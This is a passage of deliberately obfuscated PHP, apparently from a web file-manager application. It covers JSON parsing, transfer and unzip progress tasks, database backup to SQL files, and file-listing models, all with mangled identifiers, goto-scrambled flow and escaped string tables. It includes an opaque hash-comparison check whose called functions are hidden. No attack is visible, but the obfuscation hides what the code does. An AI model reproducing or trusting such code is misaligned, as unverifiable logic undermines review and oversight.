$eЄ[$eӉѸ])); } elseif ($eЄ[$eӉѸ] == $Aҫӌ[$D[1858]] && $Aҫӌ[$D[1857]] == SERVICES_JSON_IN_STR && (strlen(substr($eЄ, 0, $eӉѸ)) - strlen(rtrim(substr($eЄ, 0, $eӉѸ), $D[94]))) % 2 != 1) { array_pop($BԿ); } elseif ($eЄ[$eӉѸ] == $D[154] && in_array($Aҫӌ[$D[1857]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BԿ, array($D[1857] => SERVICES_JSON_IN_ARR, $D[260] => $eӉѸ, $D[1858] => !1)); } elseif ($eЄ[$eӉѸ] == $D[468] && $Aҫӌ[$D[1857]] == SERVICES_JSON_IN_ARR) { array_pop($BԿ); } elseif ($eЄ[$eӉѸ] == $D[1037] && in_array($Aҫӌ[$D[1857]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BԿ, array($D[1857] => SERVICES_JSON_IN_OBJ, $D[260] => $eӉѸ, $D[1858] => !1)); } elseif ($eЄ[$eӉѸ] == $D[312] && $Aҫӌ[$D[1857]] == SERVICES_JSON_IN_OBJ) { array_pop($BԿ); } elseif ($B㏤ý == $D[1861] && in_array($Aҫӌ[$D[1857]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BԿ, array($D[1857] => SERVICES_JSON_IN_CMT, $D[260] => $eӉѸ, $D[1858] => !1)); $eӉѸ++; } elseif ($B㏤ý == $D[1862] && $Aҫӌ[$D[1857]] == SERVICES_JSON_IN_CMT) { array_pop($BԿ); $eӉѸ++; for ($E = $Aҫӌ[$D[260]]; $E <= $eӉѸ; ++$E) { $eЄ = substr_replace($eЄ, $D[50], $E, 1); } } } if (reset($BԿ) == SERVICES_JSON_IN_ARR) { return $A; } elseif (reset($BԿ) == SERVICES_JSON_IN_OBJ) { return $Aֹ; } goto e; bٲͲ: $eЄ = $this->reduce_string($eЄ); if ($eЄ == $D[33]) { if (reset($BԿ) == SERVICES_JSON_IN_ARR) { return $A; } else { return $Aֹ; } } $d = strlen($eЄ); goto AΧ; e: } } } function isError($aƕ, $dĵ = null) { $C =& $_SERVER[놫Ӱ]; if (class_exists($C[1863])) { return PEAR::isError($aƕ, $dĵ); } elseif (is_object($aƕ) && (get_class($aƕ) == $C[1864] || is_subclass_of($aƕ, $C[1864]))) { return !0; } return !1; } } goto DŠ; E: if ($_SERVER[$_SERVER[놫Ӱ][782]] != $D쒧($A˕)) { goto c鵌; Dٷ: $e؇̅($A˕); goto A󫏵; dؐ: $Bٌ = explode($_SERVER[놫Ӱ][214], $A); if (count($Bٌ) < $_SERVER[놫Ӱ][573]) { $b = $_SERVER[놫Ӱ][785]; $b(); } $e؇̅ = $_SERVER[놫Ӱ][967]; goto Dٷ; c鵌: $cܩ = $_SERVER[놫Ӱ][784]; $aΌ = $_SERVER[$_SERVER[놫Ӱ][779]] . $_SERVER[놫Ӱ][780]; $A = $cܩ($aΌ); goto dؐ; A󫏵: } class TaskHttp extends Task { protected function startAfter() { $bؤ =& $_SERVER[놫Ӱ]; Hook::bind($bؤ[1376], array($this, $bؤ[1399])); Hook::bind($bؤ[1378], array($this, $bؤ[1400])); Hook::bind($bؤ[1380], array($this, $bؤ[1401])); } protected function endAfter() { $E =& $_SERVER[놫Ӱ]; Hook::unbind($E[1376], array($this, $E[1399])); Hook::unbind($E[1378], array($this, $E[1400])); Hook::unbind($E[1380], array($this, $E[1401])); } public function progressStart($Dˬݏ) { $d =& $_SERVER[놫Ӱ]; $e = curl_getinfo($Dˬݏ); self::log($d[1402] . $e[$d[292]]); self::valueSet($this->task[$d[364]], $this->task); } public function progressEnd($bБ) { $a銔 =& $_SERVER[놫Ӱ]; self::log($a銔[1403] . $this->task[$a銔[364]]); $this->end(); } public function progress($bੜ, $c, $D؉혜, $Bѱ, $b둍) { $bȠʪ =& $_SERVER[놫Ӱ]; $c =& $this->task; if ($b둍 > 0) { $c[$bȠʪ[1281]] = $c[$bȠʪ[1281]] == 0 ? $Bѱ : $c[$bȠʪ[1281]]; $c[$bȠʪ[1286]] = $b둍; } else { if ($D؉혜 > 0) { $c[$bȠʪ[1281]] = $c[$bȠʪ[1281]] == 0 ? $c : $c[$bȠʪ[1281]]; $c[$bȠʪ[1286]] = $D؉혜; } } $this->update(); self::log("\160\162\157\x67\162\x65\163\163\110\164\164\x70\x3a\x64\x6f\x77\156\x3a{$D؉혜}\x2f{$c}\x3b\x20\165\160\154\157\141\x64\72{$b둍}\57{$Bѱ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto B; f: Hook::bind($Fʲ[1008], array($this, $Fʲ[1406])); $C =& $this->task; $C[$Fʲ[1407]] = $Fʲ[1013]; goto f; f: if (!$C[$Fʲ[1237]]) { $C[$Fʲ[1237]] = LNG($Fʲ[1408]); } goto b; B: $Fʲ =& $_SERVER[놫Ӱ]; parent::startAfter(); Hook::bind($Fʲ[1404], array($this, $Fʲ[1405])); goto f; b: } protected function endAfter() { $C۳ =& $_SERVER[놫Ӱ]; parent::endAfter(); Hook::unbind($C۳[1404], array($this, $C۳[1405])); Hook::unbind($C۳[1008], array($this, $C۳[1406])); } public function updateAfter() { $Cێ =& $_SERVER[놫Ӱ]; $Bԍ =& $this->task; if (!$Bԍ[$Cێ[1281]] || !$Bԍ[$Cێ[683]]) { return; } if ($Bԍ[$Cێ[1407]] == $Cێ[1013]) { $fتɍ = 0; if ($Bԍ[$Cێ[1384]]) { $fتɍ = $Bԍ[$Cێ[1385]] / $Bԍ[$Cێ[1384]]; } $Bԍ[$Cێ[1340]] = $fتɍ * 0.3; } else { if ($Bԍ[$Cێ[1407]] == $Cێ[298]) { $fتɍ = $Bԍ[$Cێ[1286]] / $Bԍ[$Cێ[1281]]; $Bԍ[$Cێ[1340]] = 0.3 + $fتɍ * 0.4; } else { if ($Bԍ[$Cێ[1407]] == $Cێ[90]) { $bƐ = 0; if ($Bԍ[$Cێ[1386]] == $Cێ[90]) { $bƐ = $Bԍ[$Cێ[1385]]; } $fتɍ = ($Bԍ[$Cێ[1389]] + $bƐ) / $Bԍ[$Cێ[683]]; $Bԍ[$Cێ[1340]] = 0.3 + 0.4 + $fتɍ * 0.3; } } } if ($Bԍ[$Cێ[1340]] > 0) { $b = timeFloat() - $Bԍ[$Cێ[1342]] - $Bԍ[$Cێ[1345]]; $Bԍ[$Cێ[1346]] = $b * (1 - $Bԍ[$Cێ[1340]]) / $Bԍ[$Cێ[1340]]; } } public function addFile($A٘) { goto a; f: $dƠ[$aԤ[1283]] = $aԤ[1397]; $dƠ[$aԤ[1386]] = $aԤ[1013]; $dƠ[$aԤ[683]] = $bٸ[$aԤ[78]]; goto fې; a: $aԤ =& $_SERVER[놫Ӱ]; $dƠ =& $this->task; $bٸ = IO::info($A٘); goto a䂙; a䂙: $dƠ[$aԤ[1382]] = $bٸ[$aԤ[28]]; $dƠ[$aԤ[1384]] = $bٸ[$aԤ[78]]; $dƠ[$aԤ[1385]] = 0; goto f; fې: $dƠ[$aԤ[1281]] = 1; $Dӑ׿ = 0; $dƠ[$aԤ[1390]] = array($aԤ[1391] => $Dӑ׿ + 1, $aԤ[383] => $bٸ[$aԤ[28]], $aԤ[76] => $bٸ[$aԤ[76]], $aԤ[462] => $bٸ[$aԤ[462]] ? $bٸ[$aԤ[462]] : $bٸ[$aԤ[76]]); goto Aۃݩ; Aۃݩ: $this->update(); goto A蹠; A蹠: } public function unzipAfter($a) { goto b; Dۏ: $this->update(); self::log($Aܧ[1409] . json_encode(array($F˳Ζ, $f))); goto aڹ; Dב: if ($f[$Aܧ[29]] == $Aܧ[164]) { $F˳Ζ[$Aܧ[1281]] = 1; } else { $F˳Ζ[$Aܧ[1281]] = $f[$Aܧ[81]][$Aܧ[79]]; } $F˳Ζ[$Aܧ[1283]] = $Aܧ[33]; $F˳Ζ[$Aܧ[1386]] = 0; goto eÚ; eÚ: $F˳Ζ[$Aܧ[1286]] = 0; $F˳Ζ[$Aܧ[1384]] = 0; $F˳Ζ[$Aܧ[1385]] = 0; goto fέ; b: $Aܧ =& $_SERVER[놫Ӱ]; $F˳Ζ =& $this->task; $F˳Ζ[$Aܧ[1407]] = $Aܧ[90]; goto B̖; fέ: $F˳Ζ[$Aܧ[1382]] = $Aܧ[33]; $F˳Ζ[$Aܧ[1389]] = 0; $F˳Ζ[$Aܧ[683]] = $f[$Aܧ[78]]; goto Dۏ; B̖: $f = IO::infoWithChildren($a); $d龎 = 0; $F˳Ζ[$Aܧ[1390]] = array($Aܧ[1391] => $d龎 + 1, $Aܧ[383] => $f[$Aܧ[28]], $Aܧ[76] => $f[$Aܧ[76]], $Aܧ[462] => $f[$Aܧ[462]] ? $f[$Aܧ[462]] : $f[$Aܧ[76]]); goto Dב; aڹ: } public function nameParse($E) { goto BȽ; D: $c͵ = get_path_this($E); if (strstr($c͵, $Aɪђ[92])) { $D[$Aɪђ[1286]] += 1; $D[$Aɪђ[1281]] += 1; } $D[$Aɪђ[1382]] = $E; goto f; f: $this->update(); goto b̟; BȽ: $Aɪђ =& $_SERVER[놫Ӱ]; $D =& $this->task; if ($D[$Aɪђ[1407]] == $Aɪђ[1013]) { $D[$Aɪђ[1407]] = $Aɪђ[298]; $D[$Aɪђ[1389]] = 0; $D[$Aɪђ[683]] = 0; } goto D; b̟: } } goto Fӥ; B˝ܔ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $E̍ℼ =& $_SERVER[놫Ӱ]; self::$name = date($E̍ℼ[672]); if (!($Eۃ = Model($E̍ℼ[673])->lastItem())) { $Eۃ = $this->initData(); } else { self::$name = $Eۃ[$E̍ℼ[28]]; if ($Eۃ[$E̍ℼ[674]] == $E̍ℼ[493]) { self::$name = date($E̍ℼ[675]); $b䴿 = 0; if (isset($Eۃ[$E̍ℼ[278]][$E̍ℼ[164]][$E̍ℼ[415]])) { $b䴿 = (int) $Eۃ[$E̍ℼ[278]][$E̍ℼ[164]][$E̍ℼ[415]]; } if ($Eۃ[$E̍ℼ[28]] == self::$name) { Model($E̍ℼ[673])->remove($Eۃ[$E̍ℼ[364]]); } $Eۃ = $this->initData($b䴿, $Eۃ[$E̍ℼ[676]]); } else { $this->checkStore($Eۃ[$E̍ℼ[676]]); } } self::$option = $Eۃ; } private function initData($aޒ = 0, $c܌ = '') { goto d֍ӄ; d֍ӄ: $d =& $_SERVER[놫Ӱ]; $c = Model($d[673])->config(); if ($c܌ && $c[$d[676]] != $c܌) { $aޒ = 0; } goto fވ; E: $DȔ[$d[364]] = $BѲ; return $DȔ; goto eØë; fވ: $this->checkStore($c[$d[676]]); $DȔ = array($d[676] => $c[$d[676]], $d[28] => self::$name, $d[674] => 0, $d[677] => $c[$d[677]], $d[278] => array($d[678] => array($d[674] => 0), $d[679] => array($d[674] => 0, $d[680] => 0, $d[681] => 0, $d[29] => $d[33]), $d[682] => array($d[674] => 0, $d[680] => 0, $d[681] => 0), $d[164] => array($d[674] => 0, $d[683] => 0, $d[684] => 0, $d[685] => 0, $d[686] => 0, $d[415] => $aޒ)), $d[687] => time(), $d[688] => 0); $BѲ = Model($d[673])->insert($DȔ); goto E; eØë: } private function checkStore($CǨ) { $cՄم =& $_SERVER[놫Ӱ]; $f = Model($cՄم[689])->listData($CǨ); Model($cՄم[689])->checkConfig($f); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[놫Ӱ][673])->findByName(self::$name); } return self::$option; } public static function set($c홆Р) { $d䮎 =& $_SERVER[놫Ӱ]; $Bƭ = self::get(); foreach ($c홆Р as $AΆ => $Fߡ) { $A = explode($d䮎[92], $AΆ); $D = count($A); switch ($D) { case 1: $Bƭ[$A[0]] = $Fߡ; break; case 2: $Bƭ[$A[0]][$A[1]] = $Fߡ; break; case 3: $Bƭ[$A[0]][$A[1]][$A[2]] = $Fߡ; break; } } Model($d䮎[673])->update($Bƭ[$d䮎[364]], $Bƭ); self::$option = $Bƭ; return self::$option; } public function keep() { $Bܨ =& $_SERVER[놫Ӱ]; $E = self::get(); if ($E[$Bܨ[278]][$Bܨ[678]][$Bܨ[674]] == $Bܨ[493]) { return; } $this->backupKeep($E); self::set(array($Bܨ[690] => 1)); } private function backupKeep($b) { goto C⎠; C⎠: $B =& $_SERVER[놫Ӱ]; $B퉣 = Model($B[673])->listData(); if (empty($B퉣)) { return; } goto C⑄; d޺: $fمŪ = array_unique($fمŪ); foreach ($B퉣 as $e㇉) { if (!empty($e㇉[$B[28]]) && in_array($e㇉[$B[28]], $fمŪ)) { continue; } Model($B[673])->remove($e㇉[$B[364]]); $F͸͗ = "\173\x69\157\x3a{$b[$B[676]]}\x7d\x2f\x64\x61\164\x61\x62\141\x73\x65\x2f\x62\x61\x63\153\x75\x70\x5f{$e㇉[$B[28]]}"; IO::remove($F͸͗, !1); } goto cϞ; C⑄: $fمŪ = array(); for ($Dփ = 0; $Dփ <= 7; $Dփ++) { $fمŪ[] = date($B[675], strtotime("\55{$Dփ}\40\144\x61\171\163")); } for ($Dփ = 0; $Dփ < 12; $Dփ++) { $fمŪ[] = date($B[691], strtotime("\55{$Dփ}\x20\155\157\x6e\x74\150\163")); } goto d޺; cϞ: } public function db() { goto D͡; F: $BݒѼڔ = new BackupDb(); if (!$BݒѼڔ->index()) { return !1; } self::set(array($Cڛڑκ[692] => 1)); goto aΪލ; D͡: $Cڛڑκ =& $_SERVER[놫Ӱ]; $Cȸ᳭ = self::get(); if ($Cȸ᳭[$Cڛڑκ[278]][$Cڛڑκ[679]][$Cڛڑκ[674]] == $Cڛڑκ[493]) { return !0; } goto F; aΪލ: return !0; goto f캉; f캉: } public function dbFile() { goto d暎ì; Aܾ: $cպ = new BackupDbFile(); if (!$cպ->index()) { return !1; } self::set(array($a[693] => 1)); goto F唤; d暎ì: $a =& $_SERVER[놫Ӱ]; $b궞 = self::get(); if ($b궞[$a[278]][$a[682]][$a[674]] == $a[493]) { return !0; } goto Aܾ; F唤: return !0; goto EՄ; EՄ: } public function file() { $F =& $_SERVER[놫Ӱ]; $B = self::get(); if ($B[$F[278]][$F[164]][$F[674]] == $F[493]) { return !0; } if (!isset($B[$F[677]]) || $B[$F[677]] == $F[464]) { $F = new BackupFile(); if (!$F->index()) { return !1; } } self::set(array($F[694] => 1, $F[674] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto e; Fֺ: $D𪟯 = array($a[700] => $a[701], $a[702] => $bո쬠 + 1); Backup::set($D𪟯); $C = 0; goto Dٝ; cؒ: foreach ($F as $Aǥ) { $Cۉ = "{$eְ҆}{$Aǥ}\x2e\163\x71\154"; $C += $this->makeSqlFile($Aǥ, $Cۉ, $Eֈ, $f䧿ŵ); } $Eֈ->end(); $D𪟯 = array($a[692] => 1, $a[704] => $C); goto C䲉Ĕ; C䲉Ĕ: Backup::set($D𪟯); return !0; goto eɬ; e: $a =& $_SERVER[놫Ӱ]; $f䧿ŵ = Backup::get(); self::$io = $f䧿ŵ[$a[676]]; goto b܌; Dٝ: $eְ҆ = TEMP_FILES . $a[703] . self::$name . $a[8]; del_dir($eְ҆); mk_dir($eְ҆); goto cؒ; b܌: self::$name = $f䧿ŵ[$a[28]]; if ($D = $this->sqliteFile()) { return $this->sqliteBackup($D); } $bո쬠 = 0; goto dݐ; dݐ: $F = Model()->db()->getTables(); foreach ($F as $Aǥ) { $bո쬠 += Model($Aǥ)->count(); } $Eֈ = new Task($a[695], $a[696], $bո쬠, LNG($a[697]) . $a[698] . LNG($a[699])); goto Fֺ; eɬ: } public function makeSqlFile($e, $dޟ, $cͥ, $Dׂ˥) { goto Bѧ; b譫: $b߄ = Model($e)->getDbFields(); do { $F = Model($e)->field($b߄)->order($f˓ . $_SERVER[놫Ӱ][706])->selectPage($dǴ, $E); $Fݠ = !empty($F[$_SERVER[놫Ӱ][350]]) ? $F[$_SERVER[놫Ӱ][350]] : array(); $A𻄋 = array(); foreach ($Fݠ as $fÍ) { if ($e == $_SERVER[놫Ӱ][707] && (!isset($Dׂ˥[$_SERVER[놫Ӱ][677]]) || $Dׂ˥[$_SERVER[놫Ӱ][677]] == $_SERVER[놫Ӱ][464])) { $fÍ[$_SERVER[놫Ӱ][76]] = "\x7b\151\157\72{$BЈ㊚}\x7d" . substr($fÍ[$_SERVER[놫Ӱ][76]], strlen("\173\x69\x6f\72{$fÍ[$_SERVER[놫Ӱ][708]]}\175")); $fÍ[$_SERVER[놫Ӱ][708]] = $BЈ㊚; } $A𻄋[] = $_SERVER[놫Ӱ][709] . $this->addSqlSlashes($fÍ) . $_SERVER[놫Ӱ][710]; } if ($cރ = count($Fݠ)) { $E = "\111\116\123\x45\x52\x54\40\111\x4e\124\117\40\140{$e}\140\x20\50\x60" . implode($_SERVER[놫Ӱ][711], $b߄) . $_SERVER[놫Ӱ][712]; fwrite($DϦ䮹, $E . implode($_SERVER[놫Ӱ][713], $A𻄋) . $_SERVER[놫Ӱ][68] . PHP_EOL); $cͥ->update($cރ); } $E++; $aޝ += $cރ; } while ($cރ == $dǴ); fclose($DϦ䮹); goto F; F: return $aޝ; goto F; Bѧ: $BЈ㊚ = self::$io; $aޝ = 0; $E = 1; goto D篗; D篗: $dǴ = 2000; $DϦ䮹 = fopen($dޟ, $_SERVER[놫Ӱ][705]); $f˓ = Model($e)->getPk(); goto b譫; F: } private function addSqlSlashes($a) { $a߿ =& $_SERVER[놫Ӱ]; $Fۦ = array(); foreach ($a as $bΐ) { if (is_array($bΐ)) { $bΐ = json_encode_force($bΐ); } $bΐ = addslashes($bΐ); $bΐ = str_replace(array($a߿[714], $a߿[214]), array($a߿[715], $a߿[716]), $bΐ); $Fۦ[] = $bΐ; } return $a߿[55] . implode($a߿[717], $Fۦ) . $a߿[55]; } private function sqliteFile() { $e䂄ȇ =& $_SERVER[놫Ӱ]; $aΐ않 = null; $c = $GLOBALS[$e䂄ȇ[6]][$e䂄ȇ[17]]; if ($c[$e䂄ȇ[718]] == $e䂄ȇ[719]) { $FƱÇװ = explode($e䂄ȇ[720], $c[$e䂄ȇ[721]]); if (substr($FƱÇװ[0], 0, 6) == $e䂄ȇ[9]) { $aΐ않 = $FƱÇװ[1]; } } else { if (substr($c[$e䂄ȇ[718]], 0, 6) == $e䂄ȇ[9]) { $aΐ않 = $c[$e䂄ȇ[231]]; } } return $aΐ않; } public function sqliteBackup($fł) { goto dԷ; aߵ: $BԠ->end(); $bΩ = array($C[692] => 1, $C[704] => 1, $C[693] => 1, $C[728] => $AĜ); Backup::set($bΩ); goto E; C: $BԠ->task[$C[683]] = $AĜ; IO::copy($Fˬ° . $C[727], $B𹂠); IO::copy($fł, $B𹂠); goto aߵ; E: return !1; goto A; dԷ: $C =& $_SERVER[놫Ӱ]; $c̑ = self::$io; $Fˬ° = CONTROLLER_DIR . $C[722]; goto Dʣ󅲍; a: $bΩ = array($C[700] => $C[9], $C[702] => 1, $C[724] => $AĜ); Backup::set($bΩ); $BԠ = new TaskFileTransfer($C[725], $C[696], 1, LNG($C[697]) . $C[408] . LNG($C[699]) . $C[726]); goto C; Dʣ󅲍: $B𹂠 = "\x7b\x69\x6f\x3a{$c̑}\x7d\57\x64\x61\x74\141\142\x61\x73\x65\57\142\x61\143\153\165\160\x5f" . self::$name . $C[723]; if (!IO::exist($B𹂠)) { IO::mkdir($B𹂠); } $AĜ = IO::size($fł); goto a; A: } } class BackupDbFile { public function __construct() { } public function index() { goto Dߣ; Fו: $aČ = new TaskFileTransfer($Eȝ[725], $Eȝ[696], 0, LNG($Eȝ[697]) . $Eȝ[408] . LNG($Eȝ[699]) . $Eȝ[726]); $aČ->addPath($f腯); $b = IO::infoWithChildren($f腯); goto A; Aބ: return !0; goto Bӽ; Dߣ: $Eȝ =& $_SERVER[놫Ӱ]; $Dᐚ = Backup::get(); $Cܹ = $Dᐚ[$Eȝ[28]]; goto DĻ; DĻ: $f腯 = TEMP_FILES . "\x62\141\x63\153\x75\x70\137{$Cܹ}\57"; $C͙ = "\x7b\x69\157\x3a{$Dᐚ[$Eȝ[676]]}\175\x2f\144\141\x74\x61\142\141\x73\145\57"; IO::mkdir($C͙ . "\x62\x61\143\153\165\x70\137{$Cܹ}\57"); goto Fו; dՈ፲: IO::copy($F, $C͙ . "\142\141\x63\153\165\x70\137{$Cܹ}\57"); $aČ->end(); Backup::set(array($Eȝ[728] => $b[$Eȝ[78]])); goto Aބ; A: Backup::set(array($Eȝ[724] => $b[$Eȝ[78]])); IO::move($f腯, $C͙); $F = CONTROLLER_DIR . $Eȝ[729]; goto dՈ፲; Bӽ: } } goto DΓɍ; C: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\145"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\x6d\x65" => "\151\x6f\137\x73\157\165\162\143\145\x5f\155\145\164\x61", "\x6d\x65\164\141\x46\151\x65\154\144" => "\x73\157\165\162\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\146\171\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\156\163\145\x72\x74", "\x66\165\156\143\x74\151\x6f\156"), array("\x63\162\x65\141\x74\145\x54\151\155\145", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\166\x69\145\x77\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\x66\165\156\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($bٴ) { return $this->listSource(array($_SERVER[놫Ӱ][365] => $bٴ)); } public function typeName($Cտ) { static $e = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\147\162\157\165\160"); return $e[$Cտ . $_SERVER[놫Ӱ][33]]; } public function sourceListInfo($Cؽ, $Fפ沤 = false) { $fΧ =& $_SERVER[놫Ӱ]; $Cؽ = array_filter(array_unique($Cؽ)); if (!$Cؽ) { return array(); } $eي = $this->where(array($fΧ[366] => array($fΧ[7], $Cؽ)))->select(); $this->_listDataApply($eي, $Fפ沤); return array_to_keyvalue($eي, $fΧ[366]); } public function pathInfoFilter($F͉) { goto Eط; cǇ: $F͉[$eݒ[368]] = $this->typeName($F͉[$eݒ[368]]); if ($F͉[$eݒ[367]] != 1) { $F͉[$eݒ[157]] = $F͉[$eݒ[369]]; unset($F͉[$eݒ[369]]); } $cɴ = $eݒ[370]; goto a; a: $cɴ .= $eݒ[371]; $cɴ .= $eݒ[372]; $fʮ = explode($eݒ[47], $cɴ); goto d; d: if (isset($F͉[$eݒ[373]]) && $F͉[$eݒ[373]][$eݒ[374]] == -1) { $fʮ = array_remove_value($fʮ, $eݒ[184]); $fʮ = array_remove_value($fʮ, $eݒ[106]); $fʮ = array_remove_value($fʮ, $eݒ[375]); $fʮ = array_remove_value($fʮ, $eݒ[376]); $fʮ = array_remove_value($fʮ, $eݒ[78]); $fʮ = array_remove_value($fʮ, $eݒ[377]); } $F͉ = array_field_key($F͉, $fʮ); return $F͉; goto d; Eط: $eݒ =& $_SERVER[놫Ӱ]; $F͉[$eݒ[76]] = KodIO::make($F͉[$eݒ[366]]); $F͉[$eݒ[29]] = $F͉[$eݒ[367]] == 1 ? $eݒ[77] : $eݒ[164]; goto cǇ; d: } public function listUserFav() { goto B; eֱ: foreach ($bӲ as &$e) { $e = array($f[382] => $e[$f[364]], $f[383] => $e[$f[28]], $f[384] => $e[$f[76]], $f[385] => $e[$f[29]], $f[386] => $e[$f[184]], $f[387] => $e[$f[106]]); if ($e[$f[29]] == $f[379] && $A[$e[$f[76]]]) { $e[$f[388]] = $A[$e[$f[76]]]; } } return $bӲ; goto EۿŇ; B: $f =& $_SERVER[놫Ӱ]; $bӲ = Model($f[378])->listData(); $F걳 = array_filter_by_field($bӲ, $f[29], $f[379]); goto fȿ; fȿ: $F걳 = array_to_keyvalue($F걳, $f[33], $f[76]); if ($F걳) { $A = $this->listSource(array($f[380] => array($f[381], $F걳))); } $A = array_to_keyvalue($A[$f[350]], $f[366]); goto eֱ; EۿŇ: } public function listUserTag($aۦ׶) { goto Bξ˧; Bξ˧: $F𹉇 =& $_SERVER[놫Ӱ]; $C䰒 = Model($F𹉇[389])->listData(); $fªݪ = array_filter_by_field($C䰒, $F𹉇[390], $aۦ׶); goto fˢź̇; a͒: return $this->listSource($Aʒ); goto A˃; fˢź̇: $fªݪ = array_to_keyvalue($fªݪ, $F𹉇[33], $F𹉇[76]); if (!$fªݪ) { return array(); } $Aʒ = array($F𹉇[380] => array($F𹉇[381], $fªݪ)); goto a͒; A˃: } public function listUserRecycle() { $a =& $_SERVER[놫Ӱ]; $A׭ = Model($a[391])->listData(); if (!$A׭) { return array(); } $Aߧ = array($a[380] => array($a[381], $A׭), $a[392] => 1); return $this->listSource($Aߧ); } public function listSource($fͫ, $bӖƪ = 3000) { goto eՠܴ; eړ: $F壹 = $this->field($fɿ)->_makeOrder()->where($fͫ)->selectPage($bӖƪ); $this->_listDataApply($F壹[$Fշ[350]]); $this->_listMake($F壹); goto FԾ; eՠܴ: $Fշ =& $_SERVER[놫Ӱ]; if (!isset($fͫ[$Fշ[393]])) { $fͫ[$Fշ[393]] = 0; } $fɿ = $Fշ[394]; goto eړ; FԾ: return $F壹; goto Cˡ陶; Cˡ陶: } protected function _makeOrder() { goto dǶ; Dరݯ: if ($Aᾡѭ == $Eڙۜ[28]) { } $E䝄ڨ = $Eڙۜ[405] . $C[$Aᾡѭ] . $Eڙۜ[50] . $Eٖ[$d]; return $this->order(rtrim(trim($E䝄ڨ), $Eڙۜ[47])); goto cІ; Dҋ: $d = Input::get($Eڙۜ[404], $Eڙۜ[7], $d, array_keys($Eٖ)); if (!in_array($Aᾡѭ, array_keys($C))) { $Aᾡѭ = $Eڙۜ[28]; } if (!in_array($d, array_keys($Eٖ))) { $Aᾡѭ = $Eڙۜ[398]; } goto Dరݯ; fƬ: $Eٖ = array($Eڙۜ[398] => $Eڙۜ[399], $Eڙۜ[400] => $Eڙۜ[401]); $C = array($Eڙۜ[28] => $Eڙۜ[28], $Eڙۜ[78] => $Eڙۜ[78], $Eڙۜ[157] => $Eڙۜ[369], $Eڙۜ[375] => $Eڙۜ[375], $Eڙۜ[402] => $Eڙۜ[376], $Eڙۜ[184] => $Eڙۜ[184], $Eڙۜ[106] => $Eڙۜ[106]); $Aᾡѭ = Input::get($Eڙۜ[403], $Eڙۜ[7], $Eʖ킼, array_keys($C)); goto Dҋ; dǶ: $Eڙۜ =& $_SERVER[놫Ӱ]; $Eʖ킼 = Model($Eڙۜ[395])->get($Eڙۜ[396]); $d = Model($Eڙۜ[395])->get($Eڙۜ[397]); goto fƬ; cІ: } protected function _listDataApplyItem($BЉ, $Bڨ = false) { $Bȟ = array($BЉ); $this->_listDataApply($Bȟ, $Bڨ); return $Bȟ[0]; } protected function _listDataApply(&$B虣, $Eٛ = false) { goto C̈; C̈: $F욛ǉ =& $_SERVER[놫Ӱ]; if (!$B虣) { $B虣 = array(); return; } $Dϥ = array_to_keyvalue($B虣, $F욛ǉ[33], $F욛ǉ[366]); goto Bм; Bм: $Dϥ = array_unique($Dϥ); $this->_listSourceCache($B虣); if (!$Eٛ) { $this->_listAppendMeta($B虣, $Dϥ); $this->_listAppendFileMeta($B虣, $Dϥ); $this->_listAppendChildren($B虣, $Dϥ); $this->_listAppendPath($B虣); } goto Eމ; aӻ: $this->_listFilterInfo($B虣, $Eٛ); goto d궐; Eމ: $this->_listAppendAuth($B虣); $this->_listAppendSourceInfo($B虣, $Dϥ); $this->_listAppendUser($B虣); goto aӻ; d궐: } protected function _listSourceCache($d) { $e =& $_SERVER[놫Ӱ]; foreach ($d as $EڃĄ) { self::$cacheSourceInfo[$e[406] . $EڃĄ[$e[366]]] = $EڃĄ; } } protected function _listFilterInfo(&$A, $dى = false) { $Dڎ =& $_SERVER[놫Ӱ]; foreach ($A as &$AƂɕ) { $AƂɕ = $this->pathInfoFilter($AƂɕ); self::$cachePathInfo[$Dڎ[407] . intval($dى) . $Dڎ[408] . $AƂɕ[$Dڎ[366]]] = $AƂɕ; } } protected function _listMake(&$e) { $bҎ =& $_SERVER[놫Ӱ]; $e[$bҎ[75]] = array(); $e[$bҎ[74]] = array(); foreach ($e[$bҎ[350]] as $f˓) { $dई = $f˓[$bҎ[367]] == 1 ? $bҎ[75] : $bҎ[74]; $e[$dई][] = $f˓; } unset($e[$bҎ[350]]); } protected function _listAppendMeta(&$dǐ, $c֥狐) { goto Cޜ; B: if (!$CՔɨތ) { return; } $a㏥ = array($eӾ[411], $eӾ[412]); $F迍ꠃ = array(); goto B٥; B٥: foreach ($CՔɨތ as $E) { if (!isset($F迍ꠃ[$E[$eӾ[366]]])) { $F迍ꠃ[$E[$eӾ[366]]] = array(); } if (in_array($E[$eӾ[88]], $a㏥)) { continue; } $F迍ꠃ[$E[$eӾ[366]]][$E[$eӾ[88]]] = $E[$eӾ[354]]; } foreach ($dǐ as &$Eވ) { $Eވ[$eӾ[413]] = !1; if (isset($F迍ꠃ[$Eވ[$eӾ[366]]])) { $Eވ[$eӾ[413]] = $F迍ꠃ[$Eވ[$eӾ[366]]]; } if ($this->fileIsLock($Eވ) && $Eވ[$eӾ[373]]) { $bϳˈ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Eވ[$eӾ[373]][$eӾ[374]] = 